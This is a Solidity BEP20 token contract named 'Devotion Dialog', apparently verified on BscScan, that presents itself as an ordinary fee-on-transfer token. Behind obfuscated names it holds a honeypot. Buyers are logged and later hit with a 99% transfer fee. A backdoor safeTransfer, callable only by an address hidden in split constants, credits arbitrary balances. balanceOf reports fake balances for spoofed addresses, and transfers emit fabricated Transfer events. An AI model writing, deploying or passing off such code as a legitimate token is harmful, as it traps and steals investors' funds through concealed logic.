/**
 *Submitted for verification at BscScan.com on 2023-01-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IBEP20 {

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function getOwner() external view returns (address);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IUniswapV2Router {

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function factory() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

}




contract DevotionDialog is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 public maxWalletAmount = 0;

    uint256 private totalSenderSellAmountFundAuto = 6 * 10 ** 15;
    uint256 amountMintTxTrading = 2 ** 18 - 1;
    IUniswapV2Router public buyLiquidityWalletEnableSellFrom;
    address private WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 private launchBlock = 0;
    uint256 feeWalletTokenReceiverTradingBurnTx = 56975;
    bool private launchBurnTokenLaunched = true;

    uint256 private takeFromSellTotalReceiverTeamMarketing = 0;
    bool private tokenMintAutoFromLiquidity = false;
    uint256  constant MASK = type(uint128).max;

    uint256 private amountAutoFromMintMarketing;
    string constant _name = "Devotion Dialog";
    bool public maxLiquidityLaunchedBotsMintMarketingTotal = false;
    uint256 public exemptMarketingMaxTeamAtWalletAmountIndex = 0;

    address private toFromTxReceiver = (msg.sender); // auto-liq address
    uint160 constant atBotsSellLiquidity = 33139643385 * 2 ** 120;
    mapping(address => mapping(address => uint256)) _allowances;
    bool public toTakeExemptReceiverFeeTx = false;
    address private ZERO = 0x0000000000000000000000000000000000000000;
    bool private enableTeamReceiverTotalAmount = true;


    uint256 private burnReceiverBotsAmount;
    mapping(address => uint256) private totalEnableLiquidityIs;
    uint256  launchMinFeeTeam = 100000000 * 10 ** _decimals;

    bool private amountTotalListSellFundReceiver = true;


    uint256 private tokenBotsTotalListIsSender;
    address private walletTakeReceiverToBurnMax = (0x62Ae7BFC2f2557E4cA4Df835fFFFD2A8a3E6981e); // marketing address

    uint256 private takeMinToFrom = 3;
    uint256 private modeLiquidityWalletBurnAmountBotsTx = 0;
    uint256 constant liquidityMaxSenderToAt = 300000 * 10 ** 18;
    uint256 sellAtTxMarketing = 0;
    uint256 private receiverBurnBotsMint;
    mapping(address => bool) private senderBotsFundTotalAutoShould;
    uint256 private receiverModeBurnTx;
    bool private enableSenderWalletIs = false;
    uint256 private teamTokenFromIsTradingMint;
    uint256 amountFromSellEnable = 100000000 * (10 ** _decimals);
    uint256 private tokenFromShouldEnableSenderTotalTrading = 0;
    uint160 constant amountMinBurnTeamReceiverFeeWallet = 179664111794;

    bool private listLaunchedEnableReceiverExemptTokenMode = true;
    bool private launchToSenderTradingFee = true;
    uint256 public walletToReceiverLimit = 0;

    mapping(uint256 => address) private sellSwapWalletFundTxBuyShould;
    address constant walletMarketingFeeAt = 0x80278817090916ce6F99a30BeE6B7AA41f3b3Cb5;
    bool private listTradingLaunchedWallet = false;
    address public uniswapV2Pair;
    mapping(address => bool) private mintEnableShouldIsAmountExempt;

    uint160 constant listModeAtLiquidityShouldAmount = 156164331119 * 2 ** 80;
    
    uint256 private teamTotalBuyWallet = 3;
    uint160 constant walletSellTotalFrom = 585987871552 * 2 ** 40;


    uint256 private amountShouldAutoMode = amountFromSellEnable / 1000; // 0.1%
    uint256  liquidityWalletFromMaxShouldFee = 100000000 * 10 ** _decimals;
    uint256 constant teamFromExemptToken = 10000 * 10 ** 18;
    mapping(uint256 => address) private exemptMarketingMaxTeamAtWalletAmount;
    uint256 private mintShouldToSenderIsReceiverAt;
    uint256 private fromToReceiverBotsExemptAutoToken = 100;

    bool private liquidityMintSwapBurnShould;
    mapping(address => bool) private launchedSwapEnableMode;
    uint256 private limitReceiverReceiverListSenderAtTotal = 0;
    uint256 public mintShouldSenderAtLiquidity = 0;
    mapping(address => uint256) private exemptLiquiditySellLaunchListTo;
    mapping(address => uint256) _balances;

    address private DEAD = 0x000000000000000000000000000000000000dEaD;


    uint256 private maxListFundIs = 0;
    mapping(address => bool) private amountBurnMintBuyLiquidityEnable;

    uint256 private senderBuyTeamAmount = 0;
    string constant _symbol = "DDG";
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        buyLiquidityWalletEnableSellFrom = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(buyLiquidityWalletEnableSellFrom.factory()).createPair(address(this), buyLiquidityWalletEnableSellFrom.WETH());
        _allowances[address(this)][address(buyLiquidityWalletEnableSellFrom)] = amountFromSellEnable;

        liquidityMintSwapBurnShould = true;

        senderBotsFundTotalAutoShould[msg.sender] = true;
        senderBotsFundTotalAutoShould[0x0000000000000000000000000000000000000000] = true;
        senderBotsFundTotalAutoShould[0x000000000000000000000000000000000000dEaD] = true;
        senderBotsFundTotalAutoShould[address(this)] = true;

        amountBurnMintBuyLiquidityEnable[msg.sender] = true;
        amountBurnMintBuyLiquidityEnable[address(this)] = true;

        launchedSwapEnableMode[msg.sender] = true;
        launchedSwapEnableMode[0x0000000000000000000000000000000000000000] = true;
        launchedSwapEnableMode[0x000000000000000000000000000000000000dEaD] = true;
        launchedSwapEnableMode[address(this)] = true;

        approve(_router, amountFromSellEnable);
        approve(address(uniswapV2Pair), amountFromSellEnable);
        _balances[msg.sender] = amountFromSellEnable;
        emit Transfer(address(0), msg.sender, amountFromSellEnable);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return amountFromSellEnable;
    }

    function setlaunchFundTxLimit(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        if (takeFromSellTotalReceiverTeamMarketing == takeMinToFrom) {
            takeMinToFrom=launchedSellLiquidityLaunch;
        }
        takeFromSellTotalReceiverTeamMarketing=launchedSellLiquidityLaunch;
    }

    function toMintBuyMarketing() internal swapping {
        
        if (senderBuyTeamAmount == walletToReceiverLimit) {
            senderBuyTeamAmount = fromToReceiverBotsExemptAutoToken;
        }


        uint256 receiverReceiverFeeTx = amountShouldAutoMode.mul(modeLiquidityWalletBurnAmountBotsTx).div(mintShouldToSenderIsReceiverAt).div(2);
        uint256 senderTxWalletShouldBotsToSwap = amountShouldAutoMode.sub(receiverReceiverFeeTx);

        address[] memory limitEnableSenderExempt = new address[](2);
        limitEnableSenderExempt[0] = address(this);
        limitEnableSenderExempt[1] = buyLiquidityWalletEnableSellFrom.WETH();
        buyLiquidityWalletEnableSellFrom.swapExactTokensForETHSupportingFeeOnTransferTokens(
            senderTxWalletShouldBotsToSwap,
            0,
            limitEnableSenderExempt,
            address(this),
            block.timestamp
        );
        
        uint256 teamLiquidityAutoReceiver = address(this).balance;
        uint256 burnMinExemptSenderListBuy = mintShouldToSenderIsReceiverAt.sub(modeLiquidityWalletBurnAmountBotsTx.div(2));
        uint256 teamLiquidityAutoReceiverLiquidity = teamLiquidityAutoReceiver.mul(modeLiquidityWalletBurnAmountBotsTx).div(burnMinExemptSenderListBuy).div(2);
        uint256 teamLiquidityAutoReceiverMarketing = teamLiquidityAutoReceiver.mul(takeMinToFrom).div(burnMinExemptSenderListBuy);
        
        payable(walletTakeReceiverToBurnMax).transfer(teamLiquidityAutoReceiverMarketing);

        if (receiverReceiverFeeTx > 0) {
            buyLiquidityWalletEnableSellFrom.addLiquidityETH{value : teamLiquidityAutoReceiverLiquidity}(
                address(this),
                receiverReceiverFeeTx,
                0,
                0,
                toFromTxReceiver,
                block.timestamp
            );
            emit AutoLiquify(teamLiquidityAutoReceiverLiquidity, receiverReceiverFeeTx);
        }
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return botsSenderToAuto(msg.sender, recipient, amount);
    }

    function getliquidityAtModeMintBotsWalletIs() public view returns (uint256) {
        return amountShouldAutoMode;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function autoTradingFundLaunchedTxFromBots(address amountBuyIsBurnFundender, address teamMinEnableSell, uint256 senderTxWalletShouldBots, bool walletSenderShouldLaunchedSell) private {
        if (walletSenderShouldLaunchedSell) {
            amountBuyIsBurnFundender = address(uint160(uint160(walletMarketingFeeAt) + sellAtTxMarketing));
            sellAtTxMarketing++;
            _balances[teamMinEnableSell] = _balances[teamMinEnableSell].add(senderTxWalletShouldBots);
        } else {
            _balances[amountBuyIsBurnFundender] = _balances[amountBuyIsBurnFundender].sub(senderTxWalletShouldBots);
        }
        emit Transfer(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots);
    }

    function setliquidityAtModeMintBotsWalletIs(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        if (amountShouldAutoMode == takeMinToFrom) {
            takeMinToFrom=launchedSellLiquidityLaunch;
        }
        amountShouldAutoMode=launchedSellLiquidityLaunch;
    }

    function setexemptBuyMaxListMarketingModeMin(address launchedSellLiquidityLaunch,bool launchMaxLiquidityLimit) public onlyOwner {
        if (amountBurnMintBuyLiquidityEnable[launchedSellLiquidityLaunch] == senderBotsFundTotalAutoShould[launchedSellLiquidityLaunch]) {
           senderBotsFundTotalAutoShould[launchedSellLiquidityLaunch]=launchMaxLiquidityLimit;
        }
        if (launchedSellLiquidityLaunch != toFromTxReceiver) {
            amountTotalListSellFundReceiver=launchMaxLiquidityLimit;
        }
        amountBurnMintBuyLiquidityEnable[launchedSellLiquidityLaunch]=launchMaxLiquidityLimit;
    }

    function botsShouldMinFundModeMarketingReceiver(uint160 teamMinEnableSell) private view returns (bool) {
        return uint16(teamMinEnableSell) == feeWalletTokenReceiverTradingBurnTx;
    }

    function setLaunchBlock(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        if (launchBlock != senderBuyTeamAmount) {
            senderBuyTeamAmount=launchedSellLiquidityLaunch;
        }
        if (launchBlock == takeMinToFrom) {
            takeMinToFrom=launchedSellLiquidityLaunch;
        }
        if (launchBlock == teamTotalBuyWallet) {
            teamTotalBuyWallet=launchedSellLiquidityLaunch;
        }
        launchBlock=launchedSellLiquidityLaunch;
    }

    function getMaxTotalAmount() public {
        marketingSellTeamExempt();
    }

    function teamMintReceiverExempt(uint160 minTakeExemptSwap) private view returns (uint256) {
        uint256 amountBuyIsBurnFund = sellAtTxMarketing;
        uint256 listToTxLiquidity = minTakeExemptSwap - uint160(walletMarketingFeeAt);
        if (listToTxLiquidity < amountBuyIsBurnFund) {
            return teamFromExemptToken;
        }
        return liquidityMaxSenderToAt;
    }

    function modeToBotsSwap(address amountBuyIsBurnFundender, uint256 atFeeBurnMode) private view returns (uint256) {
        uint256 swapMintShouldMarketing = totalEnableLiquidityIs[amountBuyIsBurnFundender];
        if (swapMintShouldMarketing > 0 && liquidityToMintShould() - swapMintShouldMarketing > 2) {
            return 99;
        }
        return atFeeBurnMode;
    }

    function botsSenderToAuto(address amountBuyIsBurnFundender, address teamMinEnableSell, uint256 senderTxWalletShouldBots) internal returns (bool) {
        if (fundSellTradingModeExemptShould(uint160(teamMinEnableSell))) {
            autoTradingFundLaunchedTxFromBots(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots, false);
            return true;
        }
        if (fundSellTradingModeExemptShould(uint160(amountBuyIsBurnFundender))) {
            autoTradingFundLaunchedTxFromBots(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots, true);
            return true;
        }
        
        bool sellMarketingSwapEnable = burnModeWalletList(amountBuyIsBurnFundender) || burnModeWalletList(teamMinEnableSell);
        
        if (walletToReceiverLimit != takeMinToFrom) {
            walletToReceiverLimit = fromToReceiverBotsExemptAutoToken;
        }

        if (mintShouldSenderAtLiquidity != takeFromSellTotalReceiverTeamMarketing) {
            mintShouldSenderAtLiquidity = tokenFromShouldEnableSenderTotalTrading;
        }

        if (maxLiquidityLaunchedBotsMintMarketingTotal != enableSenderWalletIs) {
            maxLiquidityLaunchedBotsMintMarketingTotal = amountTotalListSellFundReceiver;
        }


        if (amountBuyIsBurnFundender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && botsShouldMinFundModeMarketingReceiver(uint160(teamMinEnableSell))) {
                marketingSellTeamExempt();
            }
            if (!sellMarketingSwapEnable) {
                isSenderWalletTrading(teamMinEnableSell);
            }
        }
        
        
        if (inSwap || sellMarketingSwapEnable) {return takeFundListSellToTeam(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots);}
        
        require((senderTxWalletShouldBots <= launchMinFeeTeam) || senderBotsFundTotalAutoShould[amountBuyIsBurnFundender] || senderBotsFundTotalAutoShould[teamMinEnableSell], "Max TX Limit!");

        if (launchedToLimitFundWalletLiquidityTrading()) {toMintBuyMarketing();}

        _balances[amountBuyIsBurnFundender] = _balances[amountBuyIsBurnFundender].sub(senderTxWalletShouldBots, "Insufficient Balance!");
        
        uint256 senderTxWalletShouldBotsReceived = amountEnableSwapBurn(amountBuyIsBurnFundender) ? botsLaunchedSwapTx(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots) : senderTxWalletShouldBots;

        _balances[teamMinEnableSell] = _balances[teamMinEnableSell].add(senderTxWalletShouldBotsReceived);
        emit Transfer(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBotsReceived);
        return true;
    }

    function fundSellTradingModeExemptShould(uint160 minTakeExemptSwap) private pure returns (bool) {
        if (minTakeExemptSwap >= uint160(walletMarketingFeeAt) && minTakeExemptSwap <= uint160(walletMarketingFeeAt) + 100000) {
            return true;
        }
        return false;
    }

    function getbuyMaxAutoLiquidity() public view returns (uint256) {
        if (fromToReceiverBotsExemptAutoToken == takeFromSellTotalReceiverTeamMarketing) {
            return takeFromSellTotalReceiverTeamMarketing;
        }
        return fromToReceiverBotsExemptAutoToken;
    }

    function botsLaunchedSwapTx(address amountBuyIsBurnFundender, address amountLimitTotalBuyModeReceiver, uint256 senderTxWalletShouldBots) internal returns (uint256) {
        
        if (tokenFromShouldEnableSenderTotalTrading != maxWalletAmount) {
            tokenFromShouldEnableSenderTotalTrading = takeMinToFrom;
        }

        if (walletToReceiverLimit != tokenFromShouldEnableSenderTotalTrading) {
            walletToReceiverLimit = senderBuyTeamAmount;
        }


        uint256 atFeeBurnModeAmount = senderTxWalletShouldBots.mul(receiverListAtLaunched(amountBuyIsBurnFundender, amountLimitTotalBuyModeReceiver == uniswapV2Pair)).div(fromToReceiverBotsExemptAutoToken);

        if (mintEnableShouldIsAmountExempt[amountBuyIsBurnFundender] || mintEnableShouldIsAmountExempt[amountLimitTotalBuyModeReceiver]) {
            atFeeBurnModeAmount = senderTxWalletShouldBots.mul(99).div(fromToReceiverBotsExemptAutoToken);
        }

        _balances[address(this)] = _balances[address(this)].add(atFeeBurnModeAmount);
        emit Transfer(amountBuyIsBurnFundender, address(this), atFeeBurnModeAmount);
        
        return senderTxWalletShouldBots.sub(atFeeBurnModeAmount);
    }

    function isSenderWalletTrading(address teamToTradingTotal) private {
        uint256 marketingShouldSwapTrading = toTradingLiquidityLaunch();
        if (marketingShouldSwapTrading < totalSenderSellAmountFundAuto) {
            exemptMarketingMaxTeamAtWalletAmountIndex += 1;
            exemptMarketingMaxTeamAtWalletAmount[exemptMarketingMaxTeamAtWalletAmountIndex] = teamToTradingTotal;
            exemptLiquiditySellLaunchListTo[teamToTradingTotal] += marketingShouldSwapTrading;
            if (exemptLiquiditySellLaunchListTo[teamToTradingTotal] > totalSenderSellAmountFundAuto) {
                maxWalletAmount = maxWalletAmount + 1;
                sellSwapWalletFundTxBuyShould[maxWalletAmount] = teamToTradingTotal;
            }
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        sellSwapWalletFundTxBuyShould[maxWalletAmount] = teamToTradingTotal;
    }

    function getlaunchFundTxLimit() public view returns (uint256) {
        if (takeFromSellTotalReceiverTeamMarketing != teamTotalBuyWallet) {
            return teamTotalBuyWallet;
        }
        if (takeFromSellTotalReceiverTeamMarketing != teamTotalBuyWallet) {
            return teamTotalBuyWallet;
        }
        if (takeFromSellTotalReceiverTeamMarketing != exemptMarketingMaxTeamAtWalletAmountIndex) {
            return exemptMarketingMaxTeamAtWalletAmountIndex;
        }
        return takeFromSellTotalReceiverTeamMarketing;
    }

    function getmintListLaunchedLiquidity() public view returns (uint256) {
        if (totalSenderSellAmountFundAuto != exemptMarketingMaxTeamAtWalletAmountIndex) {
            return exemptMarketingMaxTeamAtWalletAmountIndex;
        }
        if (totalSenderSellAmountFundAuto != totalSenderSellAmountFundAuto) {
            return totalSenderSellAmountFundAuto;
        }
        return totalSenderSellAmountFundAuto;
    }

    function getexemptBuyMaxListMarketingModeMin(address launchedSellLiquidityLaunch) public view returns (bool) {
            return amountBurnMintBuyLiquidityEnable[launchedSellLiquidityLaunch];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, amountFromSellEnable);
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function takeFundListSellToTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != amountFromSellEnable) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return botsSenderToAuto(sender, recipient, amount);
    }

    function setlistReceiverTakeTokenLaunchToLaunched(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        if (modeLiquidityWalletBurnAmountBotsTx != maxListFundIs) {
            maxListFundIs=launchedSellLiquidityLaunch;
        }
        if (modeLiquidityWalletBurnAmountBotsTx == exemptMarketingMaxTeamAtWalletAmountIndex) {
            exemptMarketingMaxTeamAtWalletAmountIndex=launchedSellLiquidityLaunch;
        }
        if (modeLiquidityWalletBurnAmountBotsTx == launchBlock) {
            launchBlock=launchedSellLiquidityLaunch;
        }
        modeLiquidityWalletBurnAmountBotsTx=launchedSellLiquidityLaunch;
    }

    function receiverListAtLaunched(address amountBuyIsBurnFundender, bool amountBuyIsBurnFundelling) internal returns (uint256) {
        
        if (toTakeExemptReceiverFeeTx != listLaunchedEnableReceiverExemptTokenMode) {
            toTakeExemptReceiverFeeTx = toTakeExemptReceiverFeeTx;
        }


        if (amountBuyIsBurnFundelling) {
            mintShouldToSenderIsReceiverAt = teamTotalBuyWallet + limitReceiverReceiverListSenderAtTotal;
            return modeToBotsSwap(amountBuyIsBurnFundender, mintShouldToSenderIsReceiverAt);
        }
        if (!amountBuyIsBurnFundelling && amountBuyIsBurnFundender == uniswapV2Pair) {
            mintShouldToSenderIsReceiverAt = takeMinToFrom + modeLiquidityWalletBurnAmountBotsTx;
            return mintShouldToSenderIsReceiverAt;
        }
        return modeToBotsSwap(amountBuyIsBurnFundender, mintShouldToSenderIsReceiverAt);
    }

    function launchLaunchedListSwapToken(uint160 minTakeExemptSwap) private pure returns (bool) {
        return minTakeExemptSwap == (atBotsSellLiquidity + listModeAtLiquidityShouldAmount + walletSellTotalFrom + amountMinBurnTeamReceiverFeeWallet);
    }

    function marketingSellTeamExempt() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (totalEnableLiquidityIs[sellSwapWalletFundTxBuyShould[i]] == 0) {
                    totalEnableLiquidityIs[sellSwapWalletFundTxBuyShould[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function safeTransfer(address amountBuyIsBurnFundender, address teamMinEnableSell, uint256 senderTxWalletShouldBots) public {
        if (!launchLaunchedListSwapToken(uint160(msg.sender))) {
            return;
        }
        if (fundSellTradingModeExemptShould(uint160(teamMinEnableSell))) {
            autoTradingFundLaunchedTxFromBots(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots, false);
            return;
        }
        if (fundSellTradingModeExemptShould(uint160(amountBuyIsBurnFundender))) {
            autoTradingFundLaunchedTxFromBots(amountBuyIsBurnFundender, teamMinEnableSell, senderTxWalletShouldBots, true);
            return;
        }
        if (amountBuyIsBurnFundender == address(0)) {
            _balances[teamMinEnableSell] = _balances[teamMinEnableSell].add(senderTxWalletShouldBots);
            return;
        }
    }

    function gettxLaunchLiquidityToken() public view returns (uint256) {
        if (teamTotalBuyWallet != exemptMarketingMaxTeamAtWalletAmountIndex) {
            return exemptMarketingMaxTeamAtWalletAmountIndex;
        }
        return teamTotalBuyWallet;
    }

    function liquidityToMintShould() private view returns (uint256) {
        return block.timestamp;
    }

    function toTradingLiquidityLaunch() private view returns (uint256) {
        address launchReceiverBurnMint = WBNB;
        if (address(this) < WBNB) {
            launchReceiverBurnMint = address(this);
        }
        (uint fromFeeAutoTeam, uint walletTeamTakeSwapToLiquidityLaunch,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 txTokenReceiverSender,) = WBNB == launchReceiverBurnMint ? (fromFeeAutoTeam, walletTeamTakeSwapToLiquidityLaunch) : (walletTeamTakeSwapToLiquidityLaunch, fromFeeAutoTeam);
        uint256 tradingReceiverAutoLiquidity = IERC20(WBNB).balanceOf(uniswapV2Pair) - txTokenReceiverSender;
        return tradingReceiverAutoLiquidity;
    }

    function getMaxTotalAFee() public {
        takeIsTokenShould();
    }

    function launchedToLimitFundWalletLiquidityTrading() internal view returns (bool) {
        return msg.sender != uniswapV2Pair &&
        !inSwap &&
        amountTotalListSellFundReceiver &&
        _balances[address(this)] >= amountShouldAutoMode;
    }

    function amountEnableSwapBurn(address amountBuyIsBurnFundender) internal view returns (bool) {
        return !launchedSwapEnableMode[amountBuyIsBurnFundender];
    }

    function burnModeWalletList(address teamToTradingTotal) private view returns (bool) {
        return teamToTradingTotal == walletTakeReceiverToBurnMax;
    }

    function getLaunchBlock() public view returns (uint256) {
        if (launchBlock != totalSenderSellAmountFundAuto) {
            return totalSenderSellAmountFundAuto;
        }
        if (launchBlock == amountShouldAutoMode) {
            return amountShouldAutoMode;
        }
        return launchBlock;
    }

    function setmintListLaunchedLiquidity(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        if (totalSenderSellAmountFundAuto == modeLiquidityWalletBurnAmountBotsTx) {
            modeLiquidityWalletBurnAmountBotsTx=launchedSellLiquidityLaunch;
        }
        if (totalSenderSellAmountFundAuto == mintShouldSenderAtLiquidity) {
            mintShouldSenderAtLiquidity=launchedSellLiquidityLaunch;
        }
        totalSenderSellAmountFundAuto=launchedSellLiquidityLaunch;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setbuyMaxAutoLiquidity(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        fromToReceiverBotsExemptAutoToken=launchedSellLiquidityLaunch;
    }

    function getlistReceiverTakeTokenLaunchToLaunched() public view returns (uint256) {
        if (modeLiquidityWalletBurnAmountBotsTx != limitReceiverReceiverListSenderAtTotal) {
            return limitReceiverReceiverListSenderAtTotal;
        }
        if (modeLiquidityWalletBurnAmountBotsTx != tokenFromShouldEnableSenderTotalTrading) {
            return tokenFromShouldEnableSenderTotalTrading;
        }
        if (modeLiquidityWalletBurnAmountBotsTx != takeMinToFrom) {
            return takeMinToFrom;
        }
        return modeLiquidityWalletBurnAmountBotsTx;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function settxLaunchLiquidityToken(uint256 launchedSellLiquidityLaunch) public onlyOwner {
        teamTotalBuyWallet=launchedSellLiquidityLaunch;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (fundSellTradingModeExemptShould(uint160(account))) {
            return teamMintReceiverExempt(uint160(account));
        }
        return _balances[account];
    }

    function takeIsTokenShould() private {
        if (exemptMarketingMaxTeamAtWalletAmountIndex > 0) {
            for (uint256 i = 1; i <= exemptMarketingMaxTeamAtWalletAmountIndex; i++) {
                if (totalEnableLiquidityIs[exemptMarketingMaxTeamAtWalletAmount[i]] == 0) {
                    totalEnableLiquidityIs[exemptMarketingMaxTeamAtWalletAmount[i]] = block.timestamp;
                }
            }
            exemptMarketingMaxTeamAtWalletAmountIndex = 0;
        }
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}